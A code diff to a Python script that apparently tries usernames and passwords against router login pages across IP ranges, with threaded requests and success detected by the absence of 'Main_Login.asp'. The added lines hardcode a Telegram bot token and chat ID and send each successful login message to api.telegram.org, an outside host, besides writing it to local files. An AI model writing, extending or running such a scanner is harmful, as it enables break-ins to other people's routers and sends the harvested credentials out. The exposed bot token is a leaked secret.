@@ -2,6 +2,10 @@ import requests
 from concurrent.futures import ThreadPoolExecutor
 from urllib3.exceptions import ConnectTimeoutError
 
+
+TOKEN = '6741660479:AAH91nQ2kIXbsva6NQEMpRNldhfS7vPP8Wc'
+chat_id = "1365132609"
+
 def check_login(args):
     ip_range, username, password, success_file, output_file = args
     ip_start, ip_end = map(str.strip, ip_range.split('-'))
@@ -23,6 +27,8 @@ def check_login(args):
 
             if "Main_Login.asp" not in response.text:
                 print(success_message)
+                url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={success_message}"
+                print(requests.get(url).json())
                 with open(output_file, 'a', encoding='utf-8') as f_output:
                     f_output.write(success_message)
                 with open(success_file, 'a', encoding='utf-8') as f_success:
